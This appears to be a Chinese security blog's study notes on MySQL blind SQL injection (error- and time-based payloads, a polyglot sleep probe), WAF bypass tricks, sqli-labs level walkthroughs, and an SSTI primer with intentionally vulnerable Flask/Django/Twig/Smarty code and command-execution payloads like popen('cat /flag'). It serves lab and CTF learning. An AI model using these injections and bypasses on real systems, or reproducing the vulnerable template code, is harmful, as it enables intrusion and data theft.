<h5 id="截取常用函数"><a href="#截取常用函数" class="headerlink" title="截取常用函数"></a>截取常用函数</h5><h6 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr(要截取的字符串，从哪一位开始截取，截取多长)</span><br></pre></td></tr></table></figure>

<h6 id="mid"><a href="#mid" class="headerlink" title="mid"></a>mid</h6><p>功能与substr类似，不过只能在mysql中用。</p>
<h6 id="right"><a href="#right" class="headerlink" title="right()"></a>right()</h6><p>表示截取字符串的右面几位</p>
<p><code>right(截取的字符串，截取长度)</code></p>
<p><code>ascii(right(所截取字符串, x))</code>会返回从右往左数的第x位的ASCII码</p>
<h6 id="left"><a href="#left" class="headerlink" title="left()"></a>left()</h6><p>类似right截取左边几位</p>
<p><code>ascii(reverse(left(所截取字符串, x)))</code>会返回从左往右数的第x位的ASCII码</p>
<h6 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">binary 目标字符串 regexp 正则</span><br></pre></td></tr></table></figure>

<p>直接字符串 regexp 正则表达式是大小写不敏感的，需要大小写敏感需要加上binary关键字</p>
<p>举例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;a&#x27; regexp &#x27;A&#x27;; 结果为1</span><br><span class="line">select binary &#x27;a&#x27; regexp &#x27;A&#x27;;结果为0</span><br><span class="line">select &#x27;a&#x27; regexp binary &#x27;A&#x27;;结果为0</span><br></pre></td></tr></table></figure>

<h6 id="rlike"><a href="#rlike" class="headerlink" title="rlike"></a>rlike</h6><p>类似regexp</p>
<h5 id="比较函数"><a href="#比较函数" class="headerlink" title="比较函数"></a>比较函数</h5><h6 id="BETWEEN"><a href="#BETWEEN" class="headerlink" title="BETWEEN"></a>BETWEEN</h6><p>用法：expr BETWEEN 下界 AND 上界;</p>
<p>这里的上下界可以相等,x between i and i就是表示x是否等于i的意思.</p>
<h6 id="IN"><a href="#IN" class="headerlink" title="IN"></a>IN</h6> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">expr1 in (expr1, expr2, expr3)</span><br></pre></td></tr></table></figure>

<p>有点像数学中的元素是否属于一个集合。同样也是大小写不敏感的，为了大小写敏感需要用binary关键字。</p>
<h6 id="减法运算"><a href="#减法运算" class="headerlink" title="减法运算"></a>减法运算</h6><p>在盲注中，可以用一个true去与运算一个ASCII码减去一个数字，如果返回0则说明减去的数字就是所判断的ASCII码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1 and ascii(&#x27;a&#x27;)-97;   //如果结果为0说明这位字符是chr(97)</span><br></pre></td></tr></table></figure>

<h6 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h6><p>异或更多应用在不能使用注释符的情况下</p>
<p>如果SQL语句为<code>SELECT xx FROM yy WHERE zz = &#39;$your_input&#39;;</code>因为用户的输入后面还有一个单引号，很多时候我们使用#或者–直接注释掉了这个单引号，但是如果注释符被过滤了，那么这个单引号就必须作为SQL语句的一部分</p>
<p>例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WHERE zz = &#x27;xx&#x27; or &#x27;1&#x27;^(condition)^&#x27;1&#x27;;</span><br></pre></td></tr></table></figure>

<h6 id="CASE"><a href="#CASE" class="headerlink" title="CASE"></a>CASE</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CASE WHEN (表达式) THEN exp1 ELSE exp2 END; # 表示如果表达式为真则返回exp1，否则返回exp2</span><br><span class="line">CASE 啥 WHEN 啥啥 THEN exp1 ELSE exp2 END; # 表示如果(啥=啥啥)则返回exp1，否则返回exp2</span><br></pre></td></tr></table></figure>

<p>例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT CASE &#x27;a&#x27; WHEN &#x27;a&#x27; THEN 1 ELSE 0 END;  </span><br></pre></td></tr></table></figure>

<h6 id="IF"><a href="#IF" class="headerlink" title="IF"></a>IF</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IF(表达式, exp1, exp2);  # 表示如果表达式为真则返回exp1，否则返回exp2</span><br></pre></td></tr></table></figure>

<h6 id="ELT"><a href="#ELT" class="headerlink" title="ELT"></a>ELT</h6><p>如果IF跟CASE被ban了可以使用elt函数代替。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ELT(N, str1, str2, str3, ..., strN)</span><br></pre></td></tr></table></figure>

<p>N 的值对应于这些字符串的索引</p>
<p>通常的 ELT 用法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ELT(<span class="keyword">condition</span>, <span class="string">&#x27;true_value&#x27;</span>, <span class="string">&#x27;false_value&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="笛卡尔积延时注入"><a href="#笛卡尔积延时注入" class="headerlink" title="笛卡尔积延时注入"></a>笛卡尔积延时注入</h3><p>见之前的博客。</p>
<h3 id="布尔报错盲注"><a href="#布尔报错盲注" class="headerlink" title="布尔报错盲注"></a>布尔报错盲注</h3><p>在某些情况下的布尔盲注可能没办法通过页面上本身的数据来构造true跟false两种状态，怎么样构造条件响应内容都一样，可以使用一些特性或函数当执行时会触发数据库报错来构造true跟false</p>
<h4 id="简单的poc"><a href="#简单的poc" class="headerlink" title="简单的poc"></a>简单的poc</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if( condition, 报错, 不报错);</span><br><span class="line">case when (condition) then 报错 else 不报错 end;</span><br></pre></td></tr></table></figure>

<h4 id="数据溢出报错"><a href="#数据溢出报错" class="headerlink" title="数据溢出报错"></a>数据溢出报错</h4><h5 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h5><p>用于计算e的x次方的函数，由于数字太大是会产生溢出。这个函数会在参数大于709时溢出，报错。</p>
<h5 id="cot"><a href="#cot" class="headerlink" title="cot()"></a>cot()</h5><p>余切三角函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cot(0);//报错</span><br><span class="line">cot(1);//不报错</span><br></pre></td></tr></table></figure>

<h5 id="Pow"><a href="#Pow" class="headerlink" title="Pow()"></a>Pow()</h5><p> <code>POW(x, y)</code>求x的y次方</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pow(1,999999);//正常</span><br><span class="line">pow(2,999999);//报错</span><br></pre></td></tr></table></figure>

<h5 id><a href="#" class="headerlink" title="~"></a>~</h5><p>使⽤~符号后，当前⾯⼀个数字小于后⾯⼀个数字的时候，就会触发溢出导致报错。</p>
<p>例如:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;|| ~2+2 | &#x27;1 不报错</span><br><span class="line">admin&#x27;|| ~1+2 | &#x27;1 报错</span><br></pre></td></tr></table></figure>

<h4 id="溢出报错的使用"><a href="#溢出报错的使用" class="headerlink" title="溢出报错的使用"></a>溢出报错的使用</h4><h5 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a><strong>逻辑运算</strong></h5><p>在逻辑运算中会返回true跟false，在mysql里面如果这两个参与运算<code>true为1</code>，<code>false为0</code>，根据这个特性我们构造出如下的poc来判断用户名长度是否大于7。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(length(user())==14</span><br><span class="line">exp(710-(length(user())&gt;7))</span><br><span class="line">=exp(710-(14&gt;7))</span><br><span class="line">=exp(710-(true))</span><br><span class="line">=exp(710-1)</span><br><span class="line">=exp(709)</span><br></pre></td></tr></table></figure>

<p>也可以这样,如果条件满足返回的是1 就会出发报错。</p>
<p><strong>~</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">~</span><span class="number">0</span><span class="operator">+</span>(<span class="keyword">condition</span>);</span><br></pre></td></tr></table></figure>

<h5 id="算术运算"><a href="#算术运算" class="headerlink" title="算术运算"></a>算术运算</h5><p>上面提到了通过逻辑运算来减去0 1，当然也可以减去正常函数的返回值，比如710减去<code>length(user())</code>，假设用户名长度为14 那么运算后<code>710-14=696</code>不满足报错条件，通过调整前面的的值 710、711…724当到临界点的时候比如<code>724-14=710</code>刚好报错，通过<code>724-710=14</code>即可得到具体14位数poc如下所示。</p>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">(length(user())==<span class="number">14</span></span><br><span class="line"><span class="built_in">exp</span>(<span class="number">724</span>-length(user()))</span><br><span class="line">=<span class="built_in">exp</span>(<span class="number">724</span>-<span class="number">14</span>)</span><br><span class="line">=<span class="built_in">exp</span>(<span class="number">710</span>)</span><br></pre></td></tr></table></figure>

<h4 id="函数报错构造"><a href="#函数报错构造" class="headerlink" title="函数报错构造"></a>函数报错构造</h4><h5 id="updataxml"><a href="#updataxml" class="headerlink" title="updataxml"></a>updataxml</h5><p><code>updatexml(1,if(1=1,1,0x1),1)</code></p>
<h5 id="rlike-1"><a href="#rlike-1" class="headerlink" title="rlike"></a>rlike</h5><p><code>0x28</code> 是十六进制，对应 ASCII 字符 <code>(</code>。若直接将其作为正则表达式（如 <code>RLIKE 0x28</code>），等效于 RLIKE <code>(</code>，此时正则表达式因未闭合括号而非法。<br>例如这个例子就会导致报错。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select (1 rlike 0x28);</span><br></pre></td></tr></table></figure>

<p>通过配合<code>if</code> 就可以构造出true 跟 false。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select (1 rlike if(条件,1,0x28));</span><br></pre></td></tr></table></figure>

<h5 id="regexp-1"><a href="#regexp-1" class="headerlink" title="regexp"></a>regexp</h5><p>regexp跟rlike同理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select (1 regexp if(条件,1,0x28));</span><br></pre></td></tr></table></figure>

<h3 id="布尔延时注入"><a href="#布尔延时注入" class="headerlink" title="布尔延时注入"></a>布尔延时注入</h3><p>布尔延时盲注利用了数据库的延迟响应来推断信息。在某些情况下的布尔盲注可能没办法通过页面上本身的数据来构造true跟false两种状态，怎么样构造条件响应内容都一样或者页面根本没有任何响应信息,此时可以通过构造SQL语句来强制数据库在满足特定条件时延时响应</p>
<h4 id="主要延时函数"><a href="#主要延时函数" class="headerlink" title="主要延时函数"></a>主要延时函数</h4><h5 id="sleep（）"><a href="#sleep（）" class="headerlink" title="sleep（）"></a>sleep（）</h5><figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title"><span class="built_in">SLEEP</span></span>(<span class="variable">seconds</span>);</span></span><br></pre></td></tr></table></figure>

<ul>
<li>seconds：表示暂停的时间，单位是秒。这个值可以是整数，也可以是浮动的小数。例如，SLEEP(5) 会让查询暂停 5 秒钟，而 SLEEP(0.5) 会让查询暂停 0.5 秒钟。</li>
</ul>
<p>如果使用 SLEEP() 函数返回多条记录，每条记录都会独立地暂停指定的时间。这是因为 SLEEP() 是在每一行的执行过程中被调用的，因此如果查询返回多条记录，每条记录都会独立地调用 SLEEP()，并且每个调用都会导致查询暂停。</p>
<p>例如下面这个例子，查询一共会返回三条记录，这里就算是<code>延时一秒</code>最终是 <code>1秒 × 3条记录 = 3秒</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM `sqli_data` WHERE 1=1 and sleep(1)</span><br></pre></td></tr></table></figure>

<p>我们还能这样写</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">(<span class="selector-tag">select</span>*<span class="selector-tag">from</span>(<span class="selector-tag">select</span>+sleep(<span class="number">1</span>))<span class="selector-tag">a</span>)</span><br></pre></td></tr></table></figure>

<p>现在解析一下这个poc,这个是利用子查询来达到只返回一条，这样子不管查询返回几条，在子查询里面只有一条也只会延时一次。</p>
<p>外层的查询 <code>select * from (...)</code> 表示从一个子查询中获取所有字段。<br>子查询部分是 <code>select sleep(1)</code>，调用数据库的 sleep() 函数。<br>最后面的<code>a</code>是别名的缩写，不缩写的话是这样写<code>as a</code>，在mysql内子查询必须要一个别名;</p>
<p>拿这个poc去试试看刚才那个例子,可以看到这次只延时了一秒。</p>
<h5 id="benchmark"><a href="#benchmark" class="headerlink" title="benchmark"></a>benchmark</h5><p><code>BENCHMARK</code>函数用于重复执行某表达式，语法:</p>
<p> 复制</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">BENCHMARK</span><span class="params">(count, expression)</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>count：执行 expression 的次数。</li>
<li>expression：要执行的 SQL 表达式，通常是一个查询、计算或者某些函数调用。</li>
</ul>
<p>比如这里执行<code>10000000</code>次<code>sha(1)</code>的时间就可以造成延时，如果不延时不明显可以这样<code>sha1(sha1(sha1(sha1())))</code>多套几层，来增加延时时间。</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">SELECT</span> <span class="selector-tag">benchmark</span>( <span class="number">10000000</span>, <span class="built_in">sha1</span>( <span class="string">&#x27;test&#x27;</span> ));</span><br></pre></td></tr></table></figure>

<h5 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h5><p>原理是通过大量的正则匹配实现延时，与benchmark和前面说的heavy query本质相似。</p>
<p>例如:</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> rpad(<span class="string">&#x27;a&#x27;</span>,<span class="number">4999999</span>,<span class="string">&#x27;a&#x27;</span>) RLIKE concat(repeat(<span class="string">&#x27;(a.*)+&#x27;</span>,<span class="number">30</span>),<span class="string">&#x27;b&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="通用poc"><a href="#通用poc" class="headerlink" title="通用poc"></a>通用poc</h4><p>从网络上看到了一个poc可以同时测试 数字 单引号 双引号下的延时注入,语句如下。</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">-</span>延时语句<span class="number">1</span>/*&#x27;XOR(延时语句2)OR&#x27;<span class="string">&quot;XOR(延时语句3))OR&quot;</span>*/</span><br></pre></td></tr></table></figure>

<p>构造一下如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-(select*from(select sleep(1))a)/*&#x27;XOR((select*from(select sleep(1))a))OR&#x27;&quot;XOR((select*from(select sleep(1))a)))OR&quot;*/</span><br></pre></td></tr></table></figure>

<p>可以简单分析一下，先从<strong>数值型</strong>注入开始，通过高亮也可以看出来，如果是数值型的话，后面那部分内容就会<code>/*</code> 注释不生效。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> `sqli_data` <span class="keyword">WHERE</span> <span class="number">1</span><span class="operator">-</span>延时语句<span class="comment">/*&#x27;XOR(延时语句)OR&#x27;&quot;XOR(延时语句))OR&quot;*/</span></span><br></pre></td></tr></table></figure>

<p><strong>单引号</strong>时<code>延时语句1</code>等内容都在单引号前所以不会执行，只会执行<code>延时语句2</code>，<code>延时语句3</code>部分在这里是字符串。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> `sqli_data` <span class="keyword">WHERE</span> <span class="string">&#x27;1-延时语句1/*&#x27;</span>XOR(延时语句<span class="number">2</span>)<span class="keyword">OR</span><span class="string">&#x27;&quot;XOR(延时语句3))OR&quot;*/&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/2025-05-26_191410_0657750.5417102377104426.png" alt="2025-05-26_191410_0657750.5417102377104426" loading="lazy"></p>
<p><strong>双引号</strong>时，情况如单引号差不多。</p>
<p><img src="/../images/2025-05-26_191629_2573240.7998717494623743.png" alt="2025-05-26_191629_2573240.7998717494623743" loading="lazy"></p>
<h1 id="常见waf绕过"><a href="#常见waf绕过" class="headerlink" title="常见waf绕过"></a>常见waf绕过</h1><h2 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h2><h3 id="emoji"><a href="#emoji" class="headerlink" title="emoji"></a>emoji</h3><p>如果空格被过滤可以把空格换成<code>%23emoji%0a</code></p>
<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select</span><br><span class="line">union%23😀😀%0aselect</span><br></pre></td></tr></table></figure>

<h3 id="–-0a与-00"><a href="#–-0a与-00" class="headerlink" title="–%0a与%00"></a>–%0a与%00</h3><p>–%0a代替空格，但两个连用不行，这时在前面用一个%00并url编码,原理是waf把空字节认为是结束导致了后面的语句可以绕过</p>
<h2 id="关键字被过滤"><a href="#关键字被过滤" class="headerlink" title="关键字被过滤"></a>关键字被过滤</h2><h3 id="全局替换绕过"><a href="#全局替换绕过" class="headerlink" title="全局替换绕过"></a>全局替换绕过</h3><p>绕过方法是在关键字中穿插&lt;&gt;，因为会先判断是否存在sql注入关键字然后进行全局关键字替换&lt;&gt;来防止xss漏洞</p>
<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select</span><br><span class="line">un&lt;&gt;ion sel&lt;&gt;ect</span><br></pre></td></tr></table></figure>

<h3 id="脏数据绕过"><a href="#脏数据绕过" class="headerlink" title="脏数据绕过"></a>脏数据绕过</h3><p>脏数据绕过利用了 WAF&#x2F;过滤层 与 数据库引擎 在对“异常”输入数据解析逻辑上的差异。攻击者精心构造看似混乱、非法、超出预期的输入（脏数据），目的在于干扰或欺骗前端的防御机制，使其无法正确识别隐藏其中的恶意 SQL 片段，而数据库在最终执行时却能按照攻击者的意图解析这些片段</p>
<p><strong>例如</strong></p>
<p>这里是updataxml关键字给过滤了</p>
<p><img src="/../images/%E5%9B%BE%E7%89%871.png" alt="图片1" loading="lazy"></p>
<h3 id="伪注释绕过"><a href="#伪注释绕过" class="headerlink" title="伪注释绕过"></a>伪注释绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Id=注入语句</span><br><span class="line"></span><br><span class="line">A=/*&amp;Id=注入语句&amp;b=*/</span><br></pre></td></tr></table></figure>

<p>WAF不会识别&#x2F;**&#x2F;注释中的内容</p>
<p>PHP (或其他后端语言) 在处理请求时，会将整个查询字符串 <code>A=/*&amp;Id=1 UNION SELECT username,password FROM users&amp;b=*/</code> 中的各个值提取出来。</p>
<p>应用逻辑按照设计，<strong>只关心真正需要的参数</strong> <code>Id</code>，而忽略无关参数（如 <code>A</code> 和 <code>b</code>）。</p>
]]></content>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>less8-17</title>
    <url>/2024/11/16/less8-17/</url>
    <content><![CDATA[<h1 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h1><p>和之前的第五关一样可以用因为正确查询和错误查询的页面不同而使用布尔盲注，脚本如何写后续再更新: )</p>
<h1 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h1><p>由于查询正确与否的页面相同，这边得使用时间盲注。</p>
<h1 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h1><p>同第九关，不过是双引号闭合。</p>
<h1 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h1><p>直接看源码<img src="/../images/1731767328998.jpg" alt="1731767328998" loading="lazy"></p>
<p>发现这关是通过post传输的账户密码，且为单引号闭合，但换汤不换药，我们使用的查询语句是和之前的一样的。我们在username这进行注入便可以注释掉后面检查密码的语句。</p>
<h1 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h1><p>直接看源码</p>
<p><img src="/../images/1731807941898(1).jpg" alt="1731807941898(1)" loading="lazy"></p>
<p>发现和less11一样，不过是被双引号和括号包围。</p>
<h1 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h1><p>正确查询时无回显，而报错有回显错误信息，我们可以想到less5，同样可以用盲注或者双查询注入。</p>
<h1 id="less14"><a href="#less14" class="headerlink" title="less14"></a>less14</h1><p>同13关，不过是闭合方式变成了双引号。</p>
<h1 id="less15"><a href="#less15" class="headerlink" title="less15"></a>less15</h1><p>直接看代码</p>
<p><img src="/../images/1731811151864.jpg" alt="1731811151864" loading="lazy"></p>
<p>发现正确查询和错误查询的回显是一样的（除了那个图片），那么我们可以使用盲注。我们这里先尝试时间盲注，我们用if(x,y,z),如果x为true则返回y，否则z。</p>
<p>我们便可以编辑出这样的注入<code>1&#39; or if(查询语句,sleep(1),1)-- </code>,如果正确查询，则 让页面延迟，如果错误则返回1无延迟。感觉这样效率比<code>1&#39; or if(查询语句,1,sleep(1))-- </code>高点。后续可以用脚本进行批量测试。</p>
<h1 id="less16"><a href="#less16" class="headerlink" title="less16"></a>less16</h1><p>发现和上一关一样，只是变成了双引号+括号闭合。</p>
<h1 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h1><p>打开源代码，发现和之前不一样的是多出来了一堆检查输入的代码。</p>
<p><img src="/../images/1731917093305(1).jpg" alt="1731917093305(1)" loading="lazy"></p>
<p>让我们看看各个函数分别是什么意思</p>
<p>**get_magic_quotes_gpc():**检查魔法引号是否有开启，魔法引号就是PHP 会自动对所有通过 <code>$_GET</code>、<code>$_POST</code>、<code>$_COOKIE</code> 等方式接收到的用户输入的特殊字符进行转义，即在符号前加上\来转义。</p>
<p><strong>stripslashes:</strong> 函数移除输入中被魔法引号加入的反斜杠。</p>
<p><strong>ctype_digit：</strong>检查输入是否为存数字。</p>
<p><strong>mysql_real_escape_string：</strong>在输入中将特殊字符转义，比魔法引号转义的范围小，且是手动引用。**<code>\x00</code>（NULL 字符）** -&gt; 转义为 <code>\\0</code></p>
<p>​	<strong>反斜杠（<code>\</code>）</strong> -&gt; 转义为 <code>\\</code></p>
<p>​	<strong>单引号（<code>&#39;</code>）</strong> -&gt; 转义为 <code>\&#39;</code></p>
<p>​	<strong>双引号（<code>&quot;</code>）</strong> -&gt; 转义为 <code>\&quot;</code></p>
<p>​	<strong><code>	\x1a</code>（十六进制）</strong> -&gt; 转义为 <code>\\Z</code></p>
<p><strong>intval：</strong>将输入转化成整形。</p>
<p>最后返回修改后的变量。</p>
<p>最后发现他只对用户名的输入进行检查，那么我们便可以在密码中进行注入。但前提是要获取一个合法的用户名。</p>
]]></content>
      <tags>
        <tag>sqlilab注入 web</tag>
      </tags>
  </entry>
  <entry>
    <title>ssti</title>
    <url>/2025/03/17/ssti/</url>
    <content><![CDATA[<p><strong>前言</strong></p>
<p>虽然这种类型的题目之前做过，但是并不是很了解，遂记录加深理解。</p>
<h1 id="何为SSTI"><a href="#何为SSTI" class="headerlink" title="何为SSTI"></a>何为SSTI</h1><p>SSTI 就是服务器端模板注入（Server-Side Template Injection），攻击者通过向Web应用程序的模板引擎注入恶意代码，从而在服务器端执行任意指令。</p>
<h2 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h2><p>如Jinja2、Thymeleaf、Freemarker等，用于将动态数据嵌入静态页面（如HTML）。例如，开发人员可能编写模板：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Hello &#123;&#123; user.name &#125;&#125;!</span><br></pre></td></tr></table></figure>

<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>服务端接收攻击者的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了攻击者插入的可以破坏模板的语句，从而达到攻击者的目的。</p>
<h1 id="python中的SSTI"><a href="#python中的SSTI" class="headerlink" title="python中的SSTI"></a>python中的SSTI</h1><h2 id="Flask-Jinja2"><a href="#Flask-Jinja2" class="headerlink" title="Flask&#x2F;Jinja2"></a>Flask&#x2F;Jinja2</h2><p><strong>示例</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/vulnerable&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vulnerable</span>():</span><br><span class="line">    <span class="comment"># 直接渲染用户输入的模板内容（高危操作！）</span></span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;Guest&#x27;</span>)</span><br><span class="line">    <span class="comment"># 将用户输入直接拼接到模板中</span></span><br><span class="line">    template = <span class="string">f&quot;&lt;h1&gt;Hello, <span class="subst">&#123;name&#125;</span>!&lt;/h1&gt;&quot;</span>  <span class="comment"># 用户可控的模板内容</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)  <span class="comment"># 渲染动态生成的模板</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p><code>render_template_string()</code>直接执行包含用户输入的模板字符串，导致模板引擎将其视为代码执行。</p>
<h2 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h2><p><strong>示例</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rom django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> django.template <span class="keyword">import</span> Template, Context</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vulnerable_view</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment"># 从GET参数获取用户输入</span></span><br><span class="line">    user_input = request.GET.get(<span class="string">&#x27;greeting&#x27;</span>, <span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line">    <span class="comment"># 动态拼接模板内容（高危操作！）</span></span><br><span class="line">    template_code = <span class="string">f&quot;&lt;h1&gt;&#123;&#123;&#123;&#123; <span class="subst">&#123;user_input&#125;</span> &#125;&#125;&#125;&#125;&lt;/h1&gt;&quot;</span>  <span class="comment"># 用户可控的模板语法</span></span><br><span class="line">    t = Template(template_code)  <span class="comment"># 编译用户输入的模板</span></span><br><span class="line">    context = Context()</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(t.render(context))  <span class="comment"># 渲染模板</span></span><br></pre></td></tr></table></figure>

<h1 id="php中的SSTI"><a href="#php中的SSTI" class="headerlink" title="php中的SSTI"></a>php中的SSTI</h1><h2 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h2><p><strong>示例</strong></p>
<p>php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$loader</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Loader\ArrayLoader</span>();</span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Environment</span>(<span class="variable">$loader</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$userInput</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]; <span class="comment">// 直接获取用户输入</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&quot;Hello &#123;&#123; name &#125;&#125;!&quot;</span>, [<span class="string">&quot;name&quot;</span> =&gt; <span class="variable">$userInput</span>]);</span><br></pre></td></tr></table></figure>

<p>攻击者可通过 <code>name</code> 参数注入恶意模板代码：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://example.com/?name=&#123;&#123;7 * 7&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h2><p>php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>();</span><br><span class="line"><span class="variable">$userInput</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>];</span><br><span class="line"><span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&quot;Message: &#123;&quot;</span> . <span class="variable">$userInput</span> . <span class="string">&quot;&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>攻击者注入：</p>
<p>http</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://example.com/?payload=&#123;system(&#x27;id&#x27;)&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Python模板注入的一般流程"><a href="#Python模板注入的一般流程" class="headerlink" title="Python模板注入的一般流程"></a>Python模板注入的一般流程</h1><p>现在大部分的SSTI还是以jinja2为主或者是python的模板，所以先讲python。</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>一般我们看到的payload长这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li><strong>对象</strong> : 在 Python 中 <strong>一切皆为对象</strong> ，当你创建一个列表 <code>[]</code>、一个字符串 <code>&quot;&quot;</code> 或一个字典 <code>&#123;&#125;</code> 时，你实际上是在创建不同类型的对象。</li>
<li><strong>继承</strong> : 我们知道对象是类的实例，类是对象的模板。在我们创建一个对象的时候，其实就是创建了一个类的实例，而在 python 中所有的类都继承于一个基类，我们可以通过一些方法，从创建的对象反向查找它的类，以及对应类父类。这样我们就能从任意一个对象回到类的端点，也就是基类，再从端点任意的向下查找。</li>
